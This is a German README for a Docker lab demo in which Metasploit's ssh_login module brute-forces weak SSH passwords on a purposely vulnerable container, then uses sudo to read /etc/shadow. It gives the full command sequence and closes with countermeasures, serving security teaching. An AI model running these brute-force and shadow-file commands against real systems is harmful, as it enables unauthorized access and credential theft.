# Szenario 3: SSH Brute-Force (schwache Passwoerter)

Live-Demo: Der Angreifer findet einen offenen SSH-Server, **erraet per Brute-Force schwache
Passwoerter**, loggt sich ein und eskaliert ueber `sudo` zu **root** — alles aus Metasploit heraus.

## Hintergrund

Der dritte klassische Einfallsweg (nach CVE-Exploit in Szenario 1 und Trojaner in Szenario 2):
**schwache oder wiederverwendete Zugangsdaten**. Kein Exploit, keine Malware — der Angreifer
probiert einfach systematisch Benutzernamen + Passwoerter durch, bis einer passt. Genau dafuer
bringt Metasploit das Modul `auxiliary/scanner/ssh/ssh_login` mit, das bei einem Treffer direkt
eine Shell-Session oeffnet.

## Architektur

```
┌──────────────────┐                          ┌──────────────────┐
│    attacker       │   1. Brute-Force          │     victim        │
│  10.30.0.10       │      ssh_login            │  10.30.0.20       │
│  Metasploit       │  ─── User+Pass-Listen ──▶ │  OpenSSH-Server   │
│  + /wordlists     │                           │                   │
│                   │   2. Treffer:             │  Accounts:        │
│  Shell-Session    │ ◀─── admin:password1 ─────│   admin  (sudo)   │
│  → sudo → root    │       mitarbeiter:hallo123│   mitarbeiter     │
└──────────────────┘                          └──────────────────┘
                Docker-Netz: lab (10.30.0.0/24)
```

## Voraussetzungen

- Docker + Docker Compose
- ca. 2 GB freier Speicher (Metasploit-Image)
- Internetverbindung (Image-Download + einmalig rockyou.txt)

## Vorbereitung — Host-Shell (einmalig, VOR der Demo)

Diese Befehle laufen in einer **normalen Shell** auf deinem Rechner (**nicht** in msfconsole):

```sh
cd szenario-3-ssh-bruteforce
ls wordlists/rockyou.txt 2>/dev/null || ./wordlists/get-rockyou.sh   # rockyou.txt holen (falls noch nicht da)
docker compose up -d --build                                         # Container starten
```

> **rockyou neu laden / erzwingen?** `rm wordlists/rockyou.txt && ./wordlists/get-rockyou.sh`.
> Das Skript nimmt automatisch Kalis lokale Kopie (`/usr/share/wordlists/rockyou.txt`), falls
> vorhanden — sonst laedt es die Datei herunter.

## Demo — du brauchst nur EIN Terminal

Das Opfer ist nur ein SSH-Server und **tut nichts**. Die ganze Demo laeuft beim **Angreifer** in
der msfconsole — **ein Terminal genuegt**. Verbinde dich damit:

```sh
docker attach ssh-attacker      # du landest direkt am   msf6 >   Prompt
```

> Ab hier ist alles ein `msf6 >`-Befehl. Nur in Schritt 3 gehst du kurz „in die Session hinein"
> (steht dort genau erklaert).
> **Konsole verlassen, ohne sie zu stoppen:** `Ctrl-P` dann `Ctrl-Q`.

### Schritt 1: Reconnaissance — offenen SSH-Port finden

```
nmap -sV 10.30.0.20
```

**Erwartet:** Port `22/tcp open ssh OpenSSH`.

---

### Schritt 2: Brute-Force — Passwoerter durchprobieren

```
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 10.30.0.20
set USERNAME admin
set PASS_FILE /wordlists/rockyou.txt
set STOP_ON_SUCCESS true
set VERBOSE true
run
```

**Was passiert:**
- `ssh_login` probiert die rockyou-Passwoerter **von oben nach unten** gegen den User `admin`
- `STOP_ON_SUCCESS true` = stoppt beim ersten Treffer (sonst liefe es ewig weiter)
- `VERBOSE true` = man sieht jeden Versuch live (das viele rote `[-] Failed:` gehoert dazu)

**Erwartet:**
```
[-] 10.30.0.20:22 - Failed: 'admin:123456'
[-] 10.30.0.20:22 - Failed: 'admin:password'
...
[+] 10.30.0.20:22 - Success: 'admin:password1'
[*] SSH session 1 opened ...
```

> **Warum so schnell?** `admin` hat mit `password1` ein **sehr** haeufiges Passwort (rockyou-Zeile
> 28) → in ~1–2 Minuten gefunden. **Wichtige Lektion:** Live-SSH ist langsam (jeder Fehlversuch
> ~2–3 s). Ein Passwort weit hinten in rockyou (z. B. `hallo123`, Zeile 26054) wuerde online
> **Stunden** dauern — sowas knackt man **offline** gegen die geklauten `/etc/shadow`-Hashes
> (Schritt 3) mit `hashcat`/`john`. Deshalb ist `/etc/shadow` der eigentliche Jackpot.

Die gefundenen Zugangsdaten stehen bereits in der gruenen `[+] Success:`-Zeile. Offene Sessions
ansehen:

```
sessions -l
```

> Den Befehl `creds` brauchst du **nicht** — er wuerde die Metasploit-Datenbank voraussetzen, die
> in diesem Container nicht laeuft („Database not connected"). Egal: die Treffer siehst du oben.

> **Variante ohne rockyou (kleine Demo-Liste, findet beide Accounts):** statt der `set`-Zeilen oben:
> ```
> set USER_FILE /wordlists/users.txt
> set PASS_FILE /wordlists/passwords.txt
> set STOP_ON_SUCCESS false
> ```

---

### Schritt 3: Zugriff nutzen + zu root eskalieren

Jetzt gehst du **in die Session hinein** — du landest in einer Shell direkt auf dem Opfer-Rechner:

```
sessions -i 1
```

> **⚠️ Rein & raus aus der Session:**
> - Nach `sessions -i 1` erscheint `[*] Starting interaction with 1...` und der **`msf6 >`-Prompt
>   verschwindet**. Ab jetzt gehen deine Befehle ans **Opfer**.
> - Zurueck zur msfconsole: **`Ctrl-Z`** druecken — die Session bleibt offen.
> - **Tippe NICHT `exit`** — das wuerde die Session (deinen Zugang) schliessen.

Auf dem Opfer — ganz normale Linux-Befehle:

```
id
hostname
echo 'password1' | sudo -S cat /etc/shadow
```

> **Bist du wirklich drin?** `id` muss `uid=1000(admin) ... ,27(sudo)` zeigen. Erscheint stattdessen
> `[*] exec:` und `uid=...(msf)`, bist du **noch in der msfconsole** (der Befehl lief auf dem
> Angreifer!) → erst `sessions -i 1` ausfuehren. **Faustregel:** `[*] exec:` = msfconsole/Angreifer,
> kein `exec:` = du bist in der Opfer-Session.

**Was passiert:** `id` zeigt `...,27(sudo)` — `admin` darf `sudo`. Mit dem bereits bekannten
Passwort lesen wir die Passwort-Hashes **aller** User aus `/etc/shadow` = **voller Root-Zugriff**.
Ein einziges schwaches Passwort genuegt. Die Hashes koennte der Angreifer offline mit
`hashcat`/`john` knacken.

Danach mit **`Ctrl-Z`** zurueck zur msfconsole.

## Stop

```sh
docker compose down -v
```

## Kernaussagen fuer die Praesentation

1. **Kein Exploit noetig** — schwache Passwoerter sind die offene Tuer.
2. **Brute-Force ist billig & automatisiert** — Metasploit probiert in Sekunden hunderte Kombis.
3. **Ein Account genuegt** — ueber `sudo` wird aus einem Login schnell Root.
4. **Gegenmassnahmen:** starke, einzigartige Passwoerter, **SSH-Key-Auth statt Passwort**,
   `fail2ban`/Rate-Limiting, MFA, Account-Lockout, kein direkter Root-Login, Passwort-Policy.

## Hinweise

- Die schwachen Accounts (`admin:password1`, `mitarbeiter:hallo123`) sind im
  [victim/Dockerfile](victim/Dockerfile) bewusst angelegt; die Wortlisten liegen unter
  [wordlists/](wordlists/).
- Szenario 3 nutzt ein eigenes Subnetz (`10.30.0.0/24`) und kollidiert daher nicht mit
  Szenario 1 (`10.10.0.0/24`) oder 2 (`10.20.0.0/24`).
- `rockyou.txt` wird **nicht** eingecheckt (~133 MB, siehe [.gitignore](.gitignore)) — per
  [wordlists/get-rockyou.sh](wordlists/get-rockyou.sh) holen. Die kleine
  [wordlists/passwords.txt](wordlists/passwords.txt) liegt als schnelle Alternative bei.
- Gegen Live-SSH probiert man rockyou nur **von oben** (haeufigste zuerst); tiefe Passwoerter
  knackt man offline gegen die `/etc/shadow`-Hashes mit `hashcat`/`john` — nicht online.
